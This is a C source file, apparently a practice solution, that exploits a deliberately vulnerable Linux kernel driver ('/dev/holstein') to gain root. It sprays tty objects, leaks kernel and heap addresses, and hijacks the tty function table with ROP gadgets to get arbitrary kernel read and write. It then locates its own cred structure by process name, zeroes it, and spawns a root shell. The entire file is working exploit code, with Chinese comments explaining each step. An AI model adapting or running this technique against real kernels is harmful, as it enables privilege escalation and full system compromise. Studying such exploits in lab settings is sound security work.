#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/prctl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

#define OPS_OFFSET 0xc38880
#define SPRAY_NUM 100
#define VULN_DRV "/dev/holstein"

uint64_t kernel_base = 0;
uint64_t base = 0xffffffff81000000;
uint64_t g_buf = 0;
int global_fd = 0;
int spray[SPRAY_NUM];
char buf[0x500];
int cache_fd = -1;

// uint64_t stack_pivot = 0xffffffff81516264; //no SMEP
uint64_t mov_rdx_rcx_ret = 0xffffffff811b7db9;
uint64_t mov_eax_rdx_ret = 0xffffffff8118a285;

void AAW32(uint64_t rdx, unsigned int rcx) {
  uint64_t *p = (uint64_t *)&buf;
  *(p + 0xc) = mov_rdx_rcx_ret - base + kernel_base; // 设置触发任意写的gadget

  *(uint64_t *)&buf[0x418] = g_buf; // 劫持tty_struct的函数表为g_buf
  write(global_fd, buf, 0x420);
  for (int i = 0; i < SPRAY_NUM; i++) {
    ioctl(spray[i], rcx, rdx); // arg1:tty设备 arg2:rcx arg3：rdx
  }
}

unsigned int AAR32(uint64_t rdx) {
  if (cache_fd == -1) { // 设置这个cache_fd是为了避免多次遍历spra数组
    uint64_t *p = (uint64_t *)&buf;
    *(p + 0xc) = mov_eax_rdx_ret - base + kernel_base; // 设置触发任意写的gadget

    *(uint64_t *)&buf[0x418] = g_buf; // 劫持tty_struct的函数表为g_buf
    write(global_fd, buf, 0x420);

    for (int i = 0; i < SPRAY_NUM; i++) {
      int v = ioctl(spray[i], 0, rdx);
      if (v != -1) {
        cache_fd = spray[i];
        return v;
      }
    }
  } else {
    return ioctl(cache_fd, 0, rdx);
  }
}

int main() {
  for (int i = 0; i < SPRAY_NUM / 2; i++) {
    spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    if (spray[i] == -1)
      perror("open");
  }

  global_fd = open("/dev/holstein", O_RDWR);
  if (global_fd == -1)
    perror("open");

  for (int i = SPRAY_NUM / 2; i < SPRAY_NUM; i++) {
    spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    if (spray[i] == -1)
      perror("open");
  }

  read(global_fd, buf, 0x500);
  kernel_base = *(uint64_t *)&buf[0x418] - OPS_OFFSET;
  printf("[+] kernel base: 0x%lx\n", kernel_base);
  g_buf = *(uint64_t *)&buf[0x438] - 0x438;
  printf("[+] heap base: 0x%lx\n", g_buf);

  puts("[*] setting .comm to shuai6666\n");

  prctl(PR_SET_NAME, "yang6666");

  uint64_t addr_cred = 0;
  uint64_t addr = 0;

  for (addr = g_buf - 0x1000000;; addr += 0x8) { // 根据进程name循环搜寻目标进程
    if ((addr & 0xfffff) == 0) {
      printf("[*] start searching 0x%lx\n",
             addr); // 每到0x1000000整数倍时就打印一次进度
    }
    if ((AAR32(addr) == 0x676e6179) && (AAR32(addr + 0x4) == 0x36363636)) {
      printf("[+] found target process: 0x%lx\n", addr);
      // 把8字节的地址分为两次4字节来读取
      addr_cred |= AAR32(addr - 0x8);                 // 读取低32位
      addr_cred |= (uint64_t)AAR32(addr - 0x4) << 32; // 读取高32位
      printf("[+] found target cred cred: 0x%lx\n", addr_cred);

      break;
    }
  }

  puts("[*] changing cred to 0\n");

  for (int i = 1; i < 9; i++) {
    AAW32(addr_cred + i * 4, 0);
  }

  puts("[*] spwan shell");

  system("/bin/sh");

  close(global_fd);

  //   for (int i = 0; i < SPRAY_NUM; i++) {
  //     close(spray[i]);
  //   }

  return 0;
}